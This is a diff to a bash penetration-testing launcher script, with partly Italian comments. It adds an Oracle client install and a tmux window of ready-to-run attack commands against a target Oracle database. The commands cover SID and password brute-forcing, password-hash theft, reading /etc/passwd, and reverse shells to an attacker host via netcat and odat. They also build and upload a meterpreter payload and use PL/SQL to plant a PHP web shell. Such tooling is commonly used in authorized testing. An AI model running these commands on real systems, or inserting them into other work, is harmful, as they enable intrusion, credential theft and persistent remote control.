@@ -680,6 +680,17 @@ else
 	sudo apt install nishang
 fi
 
+# sqlplus (Oracle) 
+printf "\n===================================\n"
+program="sqlplus"
+if is_installed "$program"; then
+	echo "[i] $program is already installed."
+else
+	echo "[->] Installing $program..."	
+	sudo apt install oracle-instantclient-sqlplus
+	sudo apt-get install libaio1
+	sudo apt autoremove
+fi
 
 
 
@@ -2520,6 +2531,98 @@ tmux send-keys -t PT:27.11 "printf \"\n# MS-SQL get mssql account HASH: activate
 tmux send-keys -t PT:27.11 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip"
 tmux send-keys -t PT:27.12 "MS-SQL get mssql account HASH: crack mssal account HASH" Enter
 tmux send-keys -t PT:27.12 "hashcat -m 5600 sql.hash.ntlmv2 /usr/share/wordlist/rockyou.txt"
+cd $folderProject
+
+
+cd $folderProjectAuthN
+# ORACLE
+tmux new-window -t PT:28 -n '[1521] Oracle'
+tmux split-window -v -t PT:28.0
+tmux resize-pane -t PT:28.0 -y 3
+tmux select-pane -t "28.0"
+tmux split-window -h -t "28.0"
+tmux split-window -h -t "28.0"
+tmux split-window -h -t "28.0"
+tmux split-window -h -t "28.0"
+tmux split-window -h -t "28.0"
+tmux split-window -v -t PT:28.6
+tmux resize-pane -t PT:28.6 -y 3
+tmux select-pane -t "28.6"
+tmux split-window -h -t "28.6"
+tmux split-window -h -t "28.6"
+tmux split-window -v -t PT:28.9
+tmux select-pane -t "28.9"
+tmux split-window -h -t "28.9"
+tmux split-window -h -t "28.9"
+tmux split-window -h -t "28.9"
+tmux split-window -v -t PT:28.13
+tmux select-pane -t "28.13"
+tmux split-window -h -t "28.13"
+tmux split-window -h -t "28.13"
+tmux split-window -h -t "28.13"
+tmux split-window -v -t PT:28.17
+tmux select-pane -t "28.17"
+tmux split-window -h -t "28.17"
+tmux split-window -h -t "28.17"
+tmux split-window -h -t "28.17"
+tmux split-window -v -t PT:28.21
+tmux select-pane -t "28.21"
+tmux split-window -h -t "28.21"
+tmux split-window -h -t "28.21"
+tmux split-window -h -t "28.21"
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:28.0 "# Oracle: odat ping" Enter
+tmux send-keys -t PT:28.0 "sudo odat tnscmd -s $ip -p 1521 --ping"
+tmux send-keys -t PT:28.1 "# Oracle: find SIDs with Standard dictionary" Enter
+tmux send-keys -t PT:28.1 "sudo odat sidguesser -s $ip -p 1521"
+tmux send-keys -t PT:28.2 "# Oracle: find SIDs with Custom dictionary" Enter
+tmux send-keys -t PT:28.2 "sudo odat sidguesser -s $ip -p 1521 --sids-file ./custom_sids.txt"
+tmux send-keys -t PT:28.3 "# Oracle: find credentials with Standard dictionary" Enter
+tmux send-keys -t PT:28.3 "sudo odat passwordguesser -s $IP -p 1521 -d SID"
+tmux send-keys -t PT:28.4 "# Oracle: find credentials with Custom dictionary" Enter
+tmux send-keys -t PT:28.4 "sudo odat passwordguesser -s $IP -p 1521 -d SID --accounts-file accounts_multiple.txt"
+tmux send-keys -t PT:28.5 "# Oracle: find credentials with Custom dictionary" Enter
+tmux send-keys -t PT:28.5 "sudo patator oracle_login sid=<SID> host=$ip user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017"
+tmux send-keys -t PT:28.6 "# Oracle: Connect Orcale with standard credetials" Enter
+tmux send-keys -t PT:28.6 "sqlplus USER/PASS@$ip:1521"
+tmux send-keys -t PT:28.7 "# Oracle: Connect Oracle with sysdba" Enter
+tmux send-keys -t PT:28.7 "sqlplus USER/PASS@$ip:1521 as sysdba"
+tmux send-keys -t PT:28.8 "printf \"\n# Oracle: Extract data\n# Select CDB and PDB\n# SQL> SELECT SYS_CONTEXT('USERENV', 'CON_NAME') AS CURRENT_PDB,(SELECT NAME FROM V$DATABASE) AS CDB_NAME FROM DUAL;\n# Select all databases related to CDB\n# SQL> SELECT CON_ID, NAME AS CONTAINER_NAME, OPEN_MODE FROM V$CONTAINERS ORDER BY CON_ID;\n# Select all tables \n# Select all the tables I have access to in the current PDB (es. HR_PDB)\n# SQL> ALTER SESSION SET CONTAINER = HR_PDB;\n# SQL> SELECT TABLE_NAME, OWNER FROM ALL_TABLES;\n# # If my account is sysdba I can use this query\n# SQL> SELECT TABLE_NAME, OWNER FROM DBA_TABLES;\n# Select all data about JOBS table of HR_PDB database\n# SQL> SELECT * FROM JOBS;\n\n\" " Enter
+tmux send-keys -t PT:28.8 "sqlplus USER/PASS@$ip:1521 as sysdba"
+tmux send-keys -t PT:28.9 "# Oracle: Info Exposure - Extract Oracle users password HASH" Enter
+tmux send-keys -t PT:28.9 "odat passwordstealer -s $ip -d mySID -U myUser -P myPsssword --get-passwords"
+tmux send-keys -t PT:28.10 "# Oracle: Info Exposure -  Download a file" Enter
+tmux send-keys -t PT:28.10 "odat ctxsys -s $ip -d mySID -U myUser -P myPassword --getFile /etc/passwd"
+tmux send-keys -t PT:28.11 "# Oracle: Info Exposure -  Find columns in database which contain Password word" Enter
+tmux send-keys -t PT:28.11 "odat search -s $ip -d mySID -U myUser -P myPassword --pwd-column-names --show-empty-columns"
+tmux send-keys -t PT:28.12 "# Oracle: Info Exposure -  Execute command" Enter
+tmux send-keys -t PT:28.12 "odat oradbg -s $ip -d mySID -U myUser -P myPassword --exec /bin/ls"
+tmux send-keys -t PT:28.13 "# Oracle: Reverse Shell (odat) - verify scheduler is active" Enter
+tmux send-keys -t PT:28.13 "odat dbmsscheduler -s $ip -d mySID -U myUser -P myPassword --test-module"
+tmux send-keys -t PT:28.14 "# Oracle: Reverse Shell (odat) - activate Listener" Enter
+tmux send-keys -t PT:28.14 "nc -nlvp 9001"
+tmux send-keys -t PT:28.15 "# Oracle: Reverse Shell (odat) - activate reverse shell" Enter
+tmux send-keys -t PT:28.15 "odat dbmsscheduler -s $ip -d mySID -U myUser -P myPassword --reverse-shell <ATTACKER_IP> 9001"
+tmux send-keys -t PT:28.16 "# Oracle: Reverse Shell (odat) - activate shell on remote server on port 4460" Enter
+tmux send-keys -t PT:28.16 "odat dbmsscheduler -s $ip -d mySID -U myUser -P myPassword --exec \"/sbin/nc.traditional -vpl 4460 -e /bin/bash\""
+tmux send-keys -t PT:28.17 "# Oracle: Reverse Shell (utlfile) - create reverse meterpreter shell" Enter
+tmux send-keys -t PT:28.17 "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f exe -o out.exe"
+tmux send-keys -t PT:28.18 "# Oracle: Reverse Shell (utlfile) - activate meterpreter listener" Enter
+tmux send-keys -t PT:28.18 "sudo msfconsole -q -x \"use exploit/multi/handler;set PAYLOAD linux/x86/meterpreter/reverse_tcp;set LHOST <ATTACKER_IP>;set LPORT 443;run\""
+tmux send-keys -t PT:28.19 "# Oracle: Reverse Shell (utlfile) - upload file on remote server" Enter
+tmux send-keys -t PT:28.19 "odat utlfile -s $ip –sysdba -d SID -U USER -P PASS –putFile /temp revShell.exe out.exe"
+tmux send-keys -t PT:28.20 "# Oracle: Reverse Shell (utlfile) - execute file on remote server" Enter
+tmux send-keys -t PT:28.20 "odat externaltable -s $ip --sysdba -d XE -U scott -P tiger --exec /temp revShell.exe"
+tmux send-keys -t PT:28.21 "# Oracle: Read / Write file - connect to Oracle" Enter
+tmux send-keys -t PT:28.21 "sqlplus64 USER/PASS@$ip:1521/SID as sysdba"
+tmux send-keys -t PT:28.22 "printf \"\n# Oracle: Read / Write file - set option to show output\n# SQL> set serveroutput ON\n# /\n\n\" " Enter
+tmux send-keys -t PT:28.22 "sqlplus USER/PASS@$ip:1521 as sysdba"
+tmux send-keys -t PT:28.23 "printf \"\n# Oracle: Read / Write file - Read /etc/passwd\n# DECLARE file UTL_FILE.FILE_TYPE; line VARCHAR2(32767); BEGIN file := UTL_FILE.FOPEN('/etc/passwd','R'); LOOP UTL_FILE.GET_LINE(file,line); DBMS_OUTPUT.PUT_LINE(line); END LOOP; UTL_FILE.FCLOSE(file); EXCEPTION WHEN NO_DATA_FOUND THEN UTL_FILE.FCLOSE(file); END; /\n\n\" " Enter
+tmux send-keys -t PT:28.23 "sqlplus USER/PASS@$ip:1521 as sysdba"
+tmux send-keys -t PT:28.24 "printf \"\n# Oracle: Read / Write file - Write /var/www/html/shell.php\n# DECLARE f UTL_FILE.FILE_TYPE; BEGIN f:=UTL_FILE.FOPEN('/var/www/html','shell.php','W'); UTL_FILE.PUT_LINE(f,'<?php'); UTL_FILE.PUT_LINE(f,'if(isset(\\\$_GET[\"cmd\"])){'); UTL_FILE.PUT_LINE(f,'\\\$output=shell_exec(\\\$_GET[\"cmd\"]);'); UTL_FILE.PUT_LINE(f,'echo\\\"<pre>\\\$output</pre>\\\";}?>'); UTL_FILE.FCLOSE(f); END; /\n\n\" " Enter
+tmux send-keys -t PT:28.24 "sqlplus USER/PASS@$ip:1521 as sysdba"
+
+
 cd $folderProject
 
 # Attivazione della modalità interattiva
